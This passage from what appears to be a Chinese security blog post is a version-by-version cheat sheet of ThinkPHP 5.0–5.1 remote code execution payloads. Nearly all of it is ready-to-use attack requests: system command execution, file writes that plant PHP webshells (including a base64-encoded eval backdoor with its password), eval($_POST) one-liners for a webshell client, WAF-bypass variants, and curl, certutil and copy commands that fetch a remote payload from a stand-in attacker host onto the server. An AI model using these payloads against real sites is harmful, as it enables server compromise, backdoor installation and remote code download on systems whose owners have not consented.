+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-3"><a href="#Thinkphp-5-0-3" class="headerlink" title="Thinkphp 5.0.3"></a>Thinkphp 5.0.3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-4"><a href="#Thinkphp-5-0-4" class="headerlink" title="Thinkphp 5.0.4"></a>Thinkphp 5.0.4</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST  /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-5"><a href="#Thinkphp-5-0-5" class="headerlink" title="Thinkphp 5.0.5"></a>Thinkphp 5.0.5</h3><p>waf对eval进行了拦截</p>
+<p>禁止了assert函数对eval函数后面的括号进行了正则过滤</p>
+<p>对file_get_contents函数后面的括号进行了正则过滤</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">http://test.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=</span><span class="php"><span class="meta">&lt;?php</span> <span class="comment">/*1111*/</span><span class="comment">/***/</span>file_put_contents<span class="comment">/*1**/</span>(<span class="comment">/***/</span><span class="string">&#x27;index11.php&#x27;</span><span class="comment">/**/</span>,file_get_contents(<span class="comment">/**/</span><span class="string">&#x27;https://www.hack.com/xxx.js&#x27;</span>))<span class="comment">/**/</span>;<span class="comment">/**/</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-6"><a href="#Thinkphp-5-0-6" class="headerlink" title="Thinkphp 5.0.6"></a>Thinkphp 5.0.6</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-7"><a href="#Thinkphp-5-0-7" class="headerlink" title="Thinkphp 5.0.7"></a>Thinkphp 5.0.7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=POST&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">aaaa=whoami&amp;_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;<span class="keyword">method</span>=<span class="keyword">GET</span>&amp;<span class="keyword">filter</span>[]=<span class="keyword">system</span>&amp;<span class="keyword">get</span>[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line">s=file_put_contents(<span class="string">&#x27;zerosec.php&#x27;</span>,<span class="string">&#x27;&lt;?php phpinfo();&#x27;</span>)&amp;_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">assert</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Thinkphp-5-0-8"><a href="#Thinkphp-5-0-8" class="headerlink" title="Thinkphp 5.0.8"></a>Thinkphp 5.0.8</h3><pre><code>http://test.com/public
+
+
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[0]=phpinfo&amp;get[1]=1
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写入文件</p>
+</blockquote>
+<pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=uploads/1.php&amp;vars[1][]=&lt;?php ?&gt;
+</code></pre>
+<blockquote>
+<p>直接用菜刀连</p>
+</blockquote>
+<pre><code>http://test.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])
+</code></pre>
+<blockquote>
+<p>getshell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<h3 id="Thinkphp-5-0-9"><a href="#Thinkphp-5-0-9" class="headerlink" title="Thinkphp 5.0.9"></a>Thinkphp 5.0.9</h3><blockquote>
+<p>test.com/?s=index/index</p>
+</blockquote>
+<pre><code>POST
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=asser
+</code></pre>
+<h3 id="Thinkphp-5-0-10"><a href="#Thinkphp-5-0-10" class="headerlink" title="Thinkphp 5.0.10"></a>Thinkphp 5.0.10</h3><p>post提交</p>
+<pre><code>http://test.com/public/index.php?s=index/index/index
+
+
+s=whoami&amp;_method=__construct&amp;method&amp;filter[]=syste
+</code></pre>
+<h3 id="Thinkphp-5-0-11"><a href="#Thinkphp-5-0-11" class="headerlink" title="Thinkphp 5.0.11"></a>Thinkphp 5.0.11</h3><pre><code>http://test.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.ph
+</code></pre>
+<h3 id="Thinkphp-5-0-12"><a href="#Thinkphp-5-0-12" class="headerlink" title="Thinkphp 5.0.12"></a>Thinkphp 5.0.12</h3><blockquote>
+<p>test.com/?s=index/index</p>
+</blockquote>
+<pre><code>post
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<h3 id="Thinkphp-5-0-13"><a href="#Thinkphp-5-0-13" class="headerlink" title="Thinkphp 5.0.13"></a>Thinkphp 5.0.13</h3><blockquote>
+<p>post提交</p>
+</blockquote>
+<pre><code>test.com/?s=index/index
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<p>补充</p>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://test.com/?s=captcha/calc">http://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<h3 id="Thinkphp-5-0-14"><a href="#Thinkphp-5-0-14" class="headerlink" title="Thinkphp 5.0.14"></a>Thinkphp 5.0.14</h3><p>1、常规命令</p>
+<pre><code>?s=index/think\app/invokefunction&amp;function=&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php.jpg&amp;vars[1][]=%3C?php%20phpinfo();?3E
+</code></pre>
+<p>2、eval（&#39;&#39;）和assert（&#39;&#39;）被拦截，命令函数被禁止</p>
+<pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();
+http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));
+</code></pre>
+<p>3、基于php7.2环境下</p>
+<pre><code>http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=1.txt&amp;vars[1][1]=1
+http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index111.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;
+写进去发现转义了尖括号
+</code></pre>
+<p>4、通过copy函数</p>
+<pre><code> http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=copy&amp;vars[1][0]= https://www.hack.com/xxx.js&amp;vars[1][1]=112233.ph
+</code></pre>
+<h3 id="Thinkphp-5-0-15"><a href="#Thinkphp-5-0-15" class="headerlink" title="Thinkphp 5.0.15"></a>Thinkphp 5.0.15</h3><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p>
+</blockquote>
+<pre><code>post
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<h3 id="Thinkphp-5-0-16"><a href="#Thinkphp-5-0-16" class="headerlink" title="Thinkphp 5.0.16"></a>Thinkphp 5.0.16</h3><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p>
+</blockquote>
+<pre><code>post
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>post
+
+s=file_put_contents(&#39;/绝对路径/test.php&#39;,base64_decode(&#39;PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4&#39;))&amp;_method=__construct&amp;filter=assert    
+
+密码aaaa
+</code></pre>
+<blockquote>
+<p>直接菜刀连</p>
+</blockquote>
+<pre><code>http://wtest.com/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1])
+</code></pre>
+<h3 id="Thinkphp-5-0-17"><a href="#Thinkphp-5-0-17" class="headerlink" title="Thinkphp 5.0.17"></a>Thinkphp 5.0.17</h3><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p>
+</blockquote>
+<pre><code>POST 
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<h3 id="Thinkphp-5-0-18"><a href="#Thinkphp-5-0-18" class="headerlink" title="Thinkphp 5.0.18"></a>Thinkphp 5.0.18</h3><p>1、windows</p>
+<pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1
+http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()
+</code></pre>
+<p>2、使用certutil</p>
+<pre><code>http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php
+</code></pre>
+<p>由于根目录没写权限，所</p>
+<h3 id="Thinkphp-5-0-19"><a href="#Thinkphp-5-0-19" class="headerlink" title="Thinkphp 5.0.19"></a>Thinkphp 5.0.19</h3><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p>
+</blockquote>
+<pre><code>POST 
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<h3 id="Thinkphp-5-0-20"><a href="#Thinkphp-5-0-20" class="headerlink" title="Thinkphp 5.0.20"></a>Thinkphp 5.0.20</h3><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p>
+</blockquote>
+<pre><code>POST 
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+c=system&amp;f=calc&amp;_method=filter
+</code></pre>
+<blockquote>
+<p>写shell</p>
+</blockquote>
+<pre><code>POST
+
+s=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert
+</code></pre>
+<blockquote>
+<p>有captcha路由时无需debug=true</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p>
+</blockquote>
+<pre><code>POST 
+
+_method=__construct&amp;filter[]=system&amp;method=GET
+</code></pre>
+<h3 id="Thinkphp-5-0-21"><a href="#Thinkphp-5-0-21" class="headerlink" title="Thinkphp 5.0.21"></a>Thinkphp 5.0.21</h3><p>1、poc</p>
+<pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre>
+<p>2、poc</p>
+<pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+</code></pre>
+<p>3、poc</p>
+<pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=system(&quot;whoami&quot;);
+</code></pre>
+<p>4、poc</p>
+<pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=eval($_POST[ian])
+</code></pre>
+<h3 id="Thinkphp-5-0-22"><a href="#Thinkphp-5-0-22" class="headerlink" title="Thinkphp 5.0.22"></a>Thinkphp 5.0.22</h3><p>1、poc</p>
+<pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami
+</code></pre>
+<p>2、poc</p>
+<pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=
+</code></pre>
+<h3 id="Thinkphp-5-0-23"><a href="#Thinkphp-5-0-23" class="headerlink" title="Thinkphp 5.0.23"></a>Thinkphp 5.0.23</h3><pre><code>POST /index.php?s=captcha HTTP/1.1
+Host: yuorip
+Accept-Encoding: gzip, deflate
+Accept: */* Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami
+</code></pre>
+<h3 id="Thinkphp-5-1-18"><a href="#Thinkphp-5-1-18" class="headerlink" title="Thinkphp 5.1.18"></a>Thinkphp 5.1.18</h3><p>1、常规poc</p>
+<pre><code>http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index_bak2.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;
+</code></pre>
+<p>2、所有目录都无写入权限,base64函数被拦截</p>
+<pre><code> http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1]
+</code></pre>
+<h3 id="Thinkphp-5-1-29"><a href="#Thinkphp-5-1-29" class="headerlink" title="Thinkphp 5.1.29"></a>Thinkphp 5.1.29</h3><p>1、代码执行</p>
+<pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
+
+http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+
+http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+</code></pre>
+<p>2、命令执行</p>
+<pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令
+
+http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令
+
+http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令
+</code></pre>
+<p>3、文件写入</p>
+<pre><code>http://test.com/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E
+
+http://test.com/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3
+</code></pre>
+<p>以上资源来源与互联网，如有侵权，请邮箱联系我，及时删除。</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/AtesetEnginner/p/12203534.html">https://www.cnblogs.com/AtesetEnginner/p/12203534.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
+              <a href="/tags/ThinkPHP/" rel="tag"># ThinkPHP</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/1972078239/" rel="prev" title="redis未授权访问">
+                  <i class="fa fa-chevron-left"></i> redis未授权访问
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/794027888/" rel="next" title="rad+xray在Linux运行的踩坑记录">
+                  rad+xray在Linux运行的踩坑记录 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fz1lin</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">79k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:11</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener external nofollow noreferrer" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+
+
+
+
